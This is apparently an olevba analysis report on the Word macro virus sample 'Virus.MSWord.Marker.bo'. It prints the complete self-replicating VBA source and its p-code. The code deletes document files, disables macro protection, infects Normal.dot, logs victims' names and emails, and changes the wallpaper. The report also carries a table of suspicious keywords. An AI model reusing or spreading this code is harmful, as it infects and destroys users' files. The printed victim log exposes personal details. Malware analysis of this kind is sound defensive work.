olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'sometimes error
Const Big_Marker = "semoanya ini dibuat ama IIQ"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim IIQ, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "Raka El-Ahmed"
Application.UserInitials = "R4K4"
Application.UserAddress = "tharaka@labalaba.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Big_Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Big_Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   IIQ = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   IIQ = IIQ & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString IIQ
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    IIQ = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString IIQ
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\IIQ.html" For Output As #1
 Print #1, "<Html><head><title>the new santo macros was back</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:tharaka@labalaba.com'>to you</a></strong></font> </p>"
 Print #1, "<font normal></center>sometimes error, the new santo macros<p>"
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\IIQ.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' IIQMMx 2000
' IIQthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 12:03:2112:03:21 PM PM-Friday, 27 Aug 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 02:47:402:47:40 PM PM-Sunday, 29 Aug 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 02:37:562:37:56 AM AM-Monday, 30 Aug 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 10:29:4310:29:43 PM PM-Wednesday, 1 Sep 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 09:28:249:28:24 AM AM-Sunday, 5 Sep 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 08:35:288:35:28 PM PM-Saturday, 11 Sep 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 10:40:610:40:06 PM PM-Friday, 24 Sep 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 04:09:204:09:02 BEN BEN-Tuesday, 21 Sep 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 10:17:210:17:02 -Freitag, 23 Okt 1998
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 02:29:5314:29:53 -Senin, 1 Nop 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 07:20:187:20:18 PM PM-Monday, 22 Nov 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 11:06:4411:06:44 AM AM-Wednesday, 24 Nov 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 10:01:3710:01:37 PM PM-Thursday, 20 May 1999
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 07:23:187:23:18 AM AM-Thursday, 20 Jan 2000
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 01:02:81:02:08 PM PM-Saturday, 22 Jan 2000
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 01:18:181:18:18 AM AM-Thursday, 3 Feb 2000
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 04:37:484:37:48 PM PM-Sunday, 6 Feb 2000
' IIQMMx 2000
' IIQMMx2000@yahoo.com

 


' 10:46:1810:46:18 AM AM-Friday, 21 Apr 2000
' Raka El-Ahmed
' tharaka@labalaba.com

 


' 02:46:202:46:20 PM PM-Monday, 24 Apr 2000
' Raka El-Ahmed
' tharaka@labalaba.com

 


' 06:29:456:29:45 PM PM-Thursday, 27 Apr 2000
' Raka El-Ahmed
' tharaka@labalaba.com

 


' 06:21:266:21:26 PM PM-Wednesday, 28 Feb 2001
' Raka El-Ahmed
' tharaka@labalaba.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.bo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12066 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "sometimes error"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x001B "semoanya ini dibuat ama IIQ"
' 	VarDefn Big_Marker
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	ArgsCall Document_Close 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #7:
' 	Dim 
' 	VarDefn isd (As String)
' Line #8:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn IIQ
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #12:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitStr 0x000D "Raka El-Ahmed"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0004 "R4K4"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0014 "tharaka@labalaba.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	GoSub InsertIon 
' Line #20:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #22:
' 	GoTo Finish 
' Line #23:
' 	Label InsertIon 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #26:
' 	Ld Big_Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #27:
' 	Ld Big_Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #28:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld DI 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St IIQ 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #33:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld IIQ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St IIQ 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	Ld IIQ 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld NTI 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St IIQ 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld IIQ 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Return 
' Line #55:
' 	Label LoggingIn 
' Line #56:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #57:
' 	GoSub ShowMe 
' Line #58:
' 	Return 
' Line #59:
' 	Label ShowMe 
' Line #60:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #63:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\IIQ.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0060 "<Html><head><title>the new santo macros was back</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007E "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:tharaka@labalaba.com'>to you</a></strong></font> </p>"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "<font normal></center>sometimes error, the new santo macros<p>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\IIQ.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #71:
' 	Return 
' Line #72:
' 	Label Finish 
' Line #73:
' 	EndSub 
' Line #74:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #75:
' Line #76:
' 	QuoteRem 0x0000 0x0025 " 06:14:2518:14:25 -Kamis, 22 Jul 1999"
' Line #77:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #78:
' 	QuoteRem 0x0000 0x0016 " IIQthebest@hotbot.com"
' Line #79:
' Line #80:
' Line #81:
' 	QuoteRem 0x0000 0x0024 " 09:07:259:07:25 -Sabtu, 24 Jun 2017"
' Line #82:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #83:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' 	QuoteRem 0x0000 0x002D " 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999"
' Line #89:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #90:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' 	QuoteRem 0x0000 0x002D " 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999"
' Line #96:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #97:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' 	QuoteRem 0x0000 0x002B " 12:03:2112:03:21 PM PM-Friday, 27 Aug 1999"
' Line #103:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #104:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' 	QuoteRem 0x0000 0x002A " 02:47:402:47:40 PM PM-Sunday, 29 Aug 1999"
' Line #110:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #111:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' 	QuoteRem 0x0000 0x002A " 02:37:562:37:56 AM AM-Monday, 30 Aug 1999"
' Line #117:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #118:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	QuoteRem 0x0000 0x002D " 10:29:4310:29:43 PM PM-Wednesday, 1 Sep 1999"
' Line #124:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #125:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0029 " 09:28:249:28:24 AM AM-Sunday, 5 Sep 1999"
' Line #131:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #132:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x002C " 08:35:288:35:28 PM PM-Saturday, 11 Sep 1999"
' Line #138:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #139:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x002A " 10:40:610:40:06 PM PM-Friday, 24 Sep 1999"
' Line #145:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #146:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x002D " 04:09:204:09:02 BEN BEN-Tuesday, 21 Sep 1999"
' Line #152:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #153:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x0026 " 10:17:210:17:02 -Freitag, 23 Okt 1998"
' Line #159:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #160:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x0024 " 02:29:5314:29:53 -Senin, 1 Nop 1999"
' Line #166:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #167:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x002A " 07:20:187:20:18 PM PM-Monday, 22 Nov 1999"
' Line #173:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #174:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x002E " 11:06:4411:06:44 AM AM-Wednesday, 24 Nov 1999"
' Line #180:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #181:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x002D " 10:01:3710:01:37 PM PM-Thursday, 20 May 1999"
' Line #187:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #188:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x002C " 07:23:187:23:18 AM AM-Thursday, 20 Jan 2000"
' Line #194:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #195:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x002B " 01:02:81:02:08 PM PM-Saturday, 22 Jan 2000"
' Line #201:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #202:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x002B " 01:18:181:18:18 AM AM-Thursday, 3 Feb 2000"
' Line #208:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #209:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x0029 " 04:37:484:37:48 PM PM-Sunday, 6 Feb 2000"
' Line #215:
' 	QuoteRem 0x0000 0x000C " IIQMMx 2000"
' Line #216:
' 	QuoteRem 0x0000 0x0015 " IIQMMx2000@yahoo.com"
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x002B " 10:46:1810:46:18 AM AM-Friday, 21 Apr 2000"
' Line #222:
' 	QuoteRem 0x0000 0x000E " Raka El-Ahmed"
' Line #223:
' 	QuoteRem 0x0000 0x0015 " tharaka@labalaba.com"
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x002A " 02:46:202:46:20 PM PM-Monday, 24 Apr 2000"
' Line #229:
' 	QuoteRem 0x0000 0x000E " Raka El-Ahmed"
' Line #230:
' 	QuoteRem 0x0000 0x0015 " tharaka@labalaba.com"
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x002C " 06:29:456:29:45 PM PM-Thursday, 27 Apr 2000"
' Line #236:
' 	QuoteRem 0x0000 0x000E " Raka El-Ahmed"
' Line #237:
' 	QuoteRem 0x0000 0x0015 " tharaka@labalaba.com"
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x002D " 06:21:266:21:26 PM PM-Wednesday, 28 Feb 2001"
' Line #243:
' 	QuoteRem 0x0000 0x000E " Raka El-Ahmed"
' Line #244:
' 	QuoteRem 0x0000 0x0015 " tharaka@labalaba.com"
' Line #245:
' Line #246:
' Line #247:
' Line #248:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

